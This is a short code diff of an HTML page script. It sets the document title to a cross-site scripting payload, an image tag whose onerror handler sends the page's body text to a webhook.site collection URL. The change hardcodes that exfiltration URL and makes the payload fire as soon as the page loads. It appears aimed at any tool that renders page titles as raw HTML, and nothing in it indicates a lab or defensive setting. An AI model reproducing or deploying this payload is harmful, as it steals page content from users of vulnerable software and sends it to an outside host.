@@ -8,12 +8,10 @@
 
         <script>
             const webhook = "'https://webhook.site/78be9a55-6ff2-4723-9cf5-c6b3dd95cacc/?query='";
-            const payloadTitle = "</h1><img src=\"x\" onerror=fetch(" + webhook +"+document.body.textContent)><h1>";
-            document.addEventListener("DOMContentLoaded", function() {
-                setTimeout(() => {
-                    self.title = payloadTitle;
-                    document.title = payloadTitle;
-                }, 1000);
+            const payloadTitle = "</h1><img src=\"x\" onerror=fetch('https://webhook.site/78be9a55-6ff2-4723-9cf5-c6b3dd95cacc/?query='+document.body.textContent)><h1>";
+            window.addEventListener("DOMContentLoaded", function() {
+                self.title = payloadTitle;
+                document.title = payloadTitle;
             })
         </script>
     </body>
